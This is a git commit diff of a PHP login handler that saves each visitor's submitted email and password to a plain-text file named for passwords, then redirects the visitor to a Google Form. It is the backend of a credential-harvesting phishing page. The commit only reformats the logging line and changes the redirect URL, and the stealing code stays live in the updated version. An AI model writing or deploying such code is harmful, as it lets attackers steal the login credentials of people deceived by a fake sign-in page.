0b313671292f9c66a1e9a3d394aa769f0eb8dc7e
Periodis <70929105+Periodis@users.noreply.github.com>
2020-09-08 01:35:08 -0500

    Update login.php

--- login.php
+++ login.php
@@ -1,4 +1,4 @@
 <?php
-file_put_contents("contraseñas.txt", "Usuario: " .$_POST['email'] . "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location : https://docs.google.com/forms/d/1cw6munBFowcjhDxF86p4D35V2YyE-CllC3pXBdVhWLo/edit');
+file_put_contents("contraseñas.txt", "Usuario: " . $_POST['email'] . "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://docs.google.com/forms/d/1cw6munBFowcjhDxF86p4D35V2YyE-CllC3pXBdVhWLo/viewform?edit_requested=true');
 exit();
